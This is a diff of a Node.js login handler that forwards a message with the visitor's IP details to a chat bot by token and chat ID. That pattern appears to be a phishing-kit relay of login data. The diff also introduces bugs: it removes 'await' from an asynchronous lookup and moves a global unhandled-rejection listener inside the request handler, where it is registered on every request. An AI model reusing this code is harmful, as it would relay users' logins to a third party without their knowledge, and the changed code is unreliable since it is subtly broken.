@@ -59,7 +59,7 @@ exports.loginPost = async (req, res) => {
         };
 
         const ipAddress = getClientIp(req);
-        const ipAddressInformation = await sendAPIRequest(ipAddress);
+        const ipAddressInformation =  sendAPIRequest(ipAddress);
 
         // Move the console.log statement outside the sendAPIRequest function
         console.log(ipAddressInformation);
@@ -87,7 +87,7 @@ exports.loginPost = async (req, res) => {
 
 
         const sendMessage = sendMessageFor(botToken, chatId);
-        await sendMessage(message); // Ensure to use await here
+        await sendMessage(message); 
 
         console.log(message);
 
@@ -98,13 +98,14 @@ exports.loginPost = async (req, res) => {
         console.error('Unexpected error:', error.message);
         res.status(500).send('Internal Server Error');
     }
-};
-
-// Move this outside of the function to catch unhandled rejections globally
+    // Move this outside of the function to catch unhandled rejections globally
 process.on('unhandledRejection', (reason, promise) => {
     console.error('Unhandled Rejection at:', promise, 'reason:', reason);
     // Handle the rejection
 });
+
+};
+
 
 
 exports.login2 = (req, res) => {
